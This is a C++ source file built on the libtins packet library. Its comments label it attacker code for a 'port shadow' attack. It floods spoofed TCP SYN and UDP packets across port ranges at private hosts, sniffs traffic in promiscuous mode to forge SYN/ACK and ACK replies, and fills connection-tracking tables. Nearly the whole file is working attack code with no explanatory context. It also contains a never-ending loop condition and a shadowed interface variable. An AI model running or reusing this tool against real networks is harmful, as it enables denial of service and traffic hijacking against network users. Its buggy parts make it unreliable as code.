#include <tins/tins.h>
#include <cassert>
#include <iostream>

#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h> /* superset of previous */

#include <string>
#include <unistd.h>
#include <thread>
#include <random>
#include <chrono>

using std::thread;
using std::cout;
using std::string;
using std::vector;
using namespace Tins;

string iface;

void tcp_attack_packets_fn() {

	/*Send a bunch of TCP SYN's from attacker*/
#define PORT_RANGE_START 1 
#define PORT_RANGE_END 62000

	PacketSender sender;
	NetworkInterface iface(iface);

	IP pkt = IP("192.168.3.131") / TCP(PORT_RANGE_START, 80);
	IP& ip = pkt.rfind_pdu<IP>();
	TCP& tcp = pkt.rfind_pdu<TCP>();
	tcp.set_flag(TCP::SYN, 1);
	tcp.seq(1);
	tcp.ack_seq(0);

	while (true) {
		for (unsigned short dport = PORT_RANGE_START;
				dport < PORT_RANGE_END; dport++) {
				tcp.dport(dport);
				ip.ttl(2);
				sender.send(pkt, iface);
		}	
		usleep(10000000);
	}
}

void tcp_fill_ephemeral_port_range() {
	/*Send a bunch of TCP SYN's from attacker*/
#define PORT_RANGE_START 1 
#define PORT_RANGE_END 62000

	string victim_ip = "192.168.3.13";
	string prefix = "192.168.3.";
	PacketSender sender;
	NetworkInterface iface(iface);
	IP pkt = IP(victim_ip) / TCP(PORT_RANGE_START, PORT_RANGE_START);
	IP& ip = pkt.rfind_pdu<IP>();
	TCP& tcp = pkt.rfind_pdu<TCP>();
	tcp.set_flag(TCP::SYN, 1);
	tcp.seq(12345);
	tcp.ack_seq(0);

	IP atk_pkt = IP("192.168.3.131") / TCP(PORT_RANGE_START, 80);
	IP& atk_ip = atk_pkt.rfind_pdu<IP>();
	TCP& atk_tcp = atk_pkt.rfind_pdu<TCP>();
	atk_tcp.set_flag(TCP::SYN, 1);
	atk_tcp.seq(12345);
	atk_tcp.ack_seq(0);


	while (true) {
		for (unsigned short sport = PORT_RANGE_START;
				sport < PORT_RANGE_END; sport++) {
			for (unsigned short dport = PORT_RANGE_START;
					dport < PORT_RANGE_END; dport++) {
				for (int octet = 13; 13 < 255; octet++){
                                        string daddr = prefix + std::to_string(octet);
                                        ip.dst_addr(daddr);
					tcp.dport(dport);
					tcp.sport(sport);
					ip.ttl(2);
					sender.send(pkt, iface);
					usleep(10);
					sender.send(atk_pkt,iface);
				}
			}
		}	
		usleep(10000000);
	}
}


bool _sniff_tcp_response_target(PDU &some_pdu) {
	/* Respond to SYN's from attacker with SYN/ACKS*/
//define IPPROTO_UDP 17

	PacketSender sender;
	NetworkInterface iface(iface);
	const IP &ip_resp = some_pdu.rfind_pdu<IP>();
	// std::cout<<"found packet with src IP: "<<ip.src_addr()<<"\n";
	// std::cout<<ip.src_addr()<<" -> "<<ip.dst_addr()<<"\n";
	if (ip_resp.src_addr() == "192.168.2.254"
		       	&& (ip_resp.dst_addr() == "192.168.3.13" 
				|| ip_resp.dst_addr() == "192.168.3.14"
				|| ip_resp.dst_addr() == "192.168.3.15"
				|| ip_resp.dst_addr() == "192.168.3.16"
				|| ip_resp.dst_addr() == "192.168.3.17"
				|| ip_resp.dst_addr() == "192.168.3.18"
				|| ip_resp.dst_addr() == "192.168.3.19"
				|| ip_resp.dst_addr() == "192.168.3.20"
				|| ip_resp.dst_addr() == "192.168.3.21"
				|| ip_resp.dst_addr() == "192.168.3.22"
				|| ip_resp.dst_addr() == "192.168.3.23"
				|| ip_resp.dst_addr() == "192.168.3.24")
		       	&& ip_resp.protocol() == IPPROTO_TCP) {

		TCP& tcp_resp = some_pdu.rfind_pdu<TCP>();
		unsigned short sport = tcp_resp.sport();
		unsigned short dport = tcp_resp.dport();
		IP pkt = IP("192.168.2.254", ip_resp.dst_addr()) / TCP(sport, dport)/RawPDU("0xdeadbeef");
		TCP& tcp = pkt.rfind_pdu<TCP>();
		IP& ip = pkt.rfind_pdu<IP>();
		tcp.seq(12345);
		tcp.set_flag(TCP::SYN, 1);
		tcp.set_flag(TCP::ACK, 1);
		tcp.ack_seq(tcp_resp.seq() + 1);
		ip.ttl(4);
		sender.send(pkt);
	}
	return true;
}

void _sniff_tcp_response_target_handler() {
	SnifferConfiguration config;
	config.set_promisc_mode(true);
	Sniffer sniffer("any", config);
	sniffer.sniff_loop(_sniff_tcp_response_target);
}

bool _sniff_tcp_response_attacker(PDU &some_pdu) {
//define IPPROTO_UDP 17

	PacketSender sender;
	NetworkInterface iface(iface);
	const IP &ip_resp = some_pdu.rfind_pdu<IP>();
	// std::cout<<"found packet with src IP: "<<ip.src_addr()<<"\n";
	// std::cout<<ip.src_addr()<<" -> "<<ip.dst_addr()<<"\n";
	if ((ip_resp.src_addr() == "192.168.3.13" || ip_resp.src_addr() == "192.168.3.14"
				|| ip_resp.src_addr() == "192.168.3.15"
				|| ip_resp.src_addr() == "192.168.3.16"
				|| ip_resp.src_addr() == "192.168.3.17"
				|| ip_resp.src_addr() == "192.168.3.18"
				|| ip_resp.src_addr() == "192.168.3.19"
				|| ip_resp.src_addr() == "192.168.3.20"
				|| ip_resp.src_addr() == "192.168.3.21"
				|| ip_resp.src_addr() == "192.168.3.22"
				|| ip_resp.src_addr() == "192.168.3.23"
				|| ip_resp.src_addr() == "192.168.3.24")
		       	&& ip_resp.protocol() == IPPROTO_TCP) {


		const TCP& tcp_resp = some_pdu.rfind_pdu<TCP>();
		unsigned short sport = tcp_resp.sport();
		unsigned short dport = tcp_resp.dport();
		IP pkt = IP("192.168.2.254", ip_resp.dst_addr()) / TCP(sport, dport)/RawPDU("0xdeadbeef");
		TCP& tcp = pkt.rfind_pdu<TCP>();
		IP& ip = pkt.rfind_pdu<IP>();
		switch(tcp_resp.flags()) {
			case 5: // SYN/ACK
				tcp.seq(tcp_resp.ack_seq());
				tcp.set_flag(TCP::ACK, 1);
				tcp.ack_seq(tcp_resp.seq() + 1);
				ip.ttl(4);
				sender.send(pkt);
				break;
			default:
				break;
		}

	}
	return true;
}

void _sniff_tcp_response_attacker_handler() {
	SnifferConfiguration config;
	config.set_promisc_mode(true);
	Sniffer sniffer("any", config);
	sniffer.sniff_loop(_sniff_tcp_response_attacker);
}



void udp_fill_ephemeral_port_range() {
#define PORT_RANGE_START 1 
#define PORT_RANGE_END 62000

	PacketSender sender;
	NetworkInterface iface(iface);

	IP pkt = IP("192.168.3.13") / UDP(PORT_RANGE_START, PORT_RANGE_START);
	IP& ip = pkt.rfind_pdu<IP>();
	ip.ttl(2);
	UDP& udp = pkt.rfind_pdu<UDP>();

	while (true) {
		for (unsigned short sport = PORT_RANGE_START;
				sport < PORT_RANGE_END; sport++) {
			for (unsigned short dport = PORT_RANGE_START;
					dport < PORT_RANGE_END; dport++) {
				udp.dport(dport);
				udp.sport(sport);
				sender.send(pkt, iface);
			}
		}	
		usleep(10000000);
	}

}




bool _sniff_udp_response(PDU &some_pdu) {
//define IPPROTO_UDP 17

	PacketSender sender;
	NetworkInterface iface(iface);
	const IP &ip_resp = some_pdu.rfind_pdu<IP>();
	// std::cout<<"found packet with src IP: "<<ip.src_addr()<<"\n";
	// std::cout<<ip.src_addr()<<" -> "<<ip.dst_addr()<<"\n";
	if (ip_resp.src_addr() == "192.168.2.254"
		       	&& (ip_resp.dst_addr() == "192.168.3.13" 
				|| ip_resp.dst_addr() == "192.168.3.14"
				|| ip_resp.dst_addr() == "192.168.3.15"
				|| ip_resp.dst_addr() == "192.168.3.16"
				|| ip_resp.dst_addr() == "192.168.3.17"
				|| ip_resp.dst_addr() == "192.168.3.18"
				|| ip_resp.dst_addr() == "192.168.3.19"
				|| ip_resp.dst_addr() == "192.168.3.20"
				|| ip_resp.dst_addr() == "192.168.3.21"
				|| ip_resp.dst_addr() == "192.168.3.22"
				|| ip_resp.dst_addr() == "192.168.3.23"
				|| ip_resp.dst_addr() == "192.168.3.24")
		       	&& ip_resp.protocol() == IPPROTO_UDP) {

		UDP& udp_resp = some_pdu.rfind_pdu<UDP>();
		unsigned short sport = udp_resp.sport();
		unsigned short dport = udp_resp.dport();
		IP pkt = IP("192.168.2.254", ip_resp.dst_addr()) / UDP(sport, dport)/RawPDU("0xdeadbeef");
		IP& ip = pkt.rfind_pdu<IP>();
		ip.ttl(4);
		sender.send(pkt);
	}
	return true;
}

void sniff_udp_handler() {
	SnifferConfiguration config;
	config.set_promisc_mode(true);
	Sniffer sniffer("any", config);
	sniffer.sniff_loop(_sniff_udp_response);
}

int main(int argc, char** argv) {
	if (argc != 2) {
		cout << "sike wrong number of args ---> (iface)\n";
		return 0;
	}

	iface = argv[1];
	bool do_tcp = true;
	bool do_attacker = true;
	if (do_tcp) {
		if (do_attacker) {// ATTACKER code
			//1. Start the thread to fill the table by sending SYNs
			thread tcp_fill_ephemeral_port_range_thread(tcp_fill_ephemeral_port_range);
			tcp_fill_ephemeral_port_range_thread.detach();

			// 2. Start the thread to create the port shadow 
			thread tcp_attack_packets_thread(tcp_attack_packets_fn);
			tcp_attack_packets_thread.detach();

			// 3. Start the thread to fill the table by sending ACKs to SYN/ACKS 
			thread sniff_tcp_response_target_handler_thread(_sniff_tcp_response_target_handler);
			sniff_tcp_response_target_handler_thread.join();

		} else {
			// 1. Start the thread to send SYN/ACKS from a separate attacher machine to fill the table
			// with persistent entries.
			thread sniff_tcp_response_target_handler_thread(_sniff_tcp_response_target_handler);
			sniff_tcp_response_target_handler_thread.join();
		}
	} else {
		// XXX: Fill in the udp related code for this.
	
	}
	return 0;
}

